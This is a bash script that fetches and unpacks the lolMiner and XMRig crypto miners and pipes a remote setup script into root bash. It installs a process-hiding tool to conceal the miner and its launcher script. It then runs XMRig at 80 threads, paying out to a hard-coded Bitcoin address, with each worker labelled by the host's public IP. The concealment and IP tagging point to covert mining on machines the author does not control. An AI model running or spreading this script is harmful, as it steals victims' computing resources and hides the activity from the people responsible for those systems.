#!/bin/bash
sudo apt update 
wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.39/lolMiner_v1.39_Lin64.tar.gz 
tar -xf lolMiner_v1.39_Lin64.tar.gz
cd 1.39
apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
apt-get install -y nodejs
npm i -g node-process-hider
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata
ph add b.sh
ph add lolMiner
sleep 14
wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz -O - | tar -xz && cd xmrig-6.17.0 && ip=$(echo \"$(curl -s ifconfig.me)\" | tr . _ ) && ./xmrig -a rx/0 -o rx.unmineable.com:3333  -u BTC:1NPgcV7FomPoZNuPQKQ1bLFZHhzCAYNEiS.$ip -p x --threads=80 --cpu-priority=5 --randomx-mode=fast --keepalive

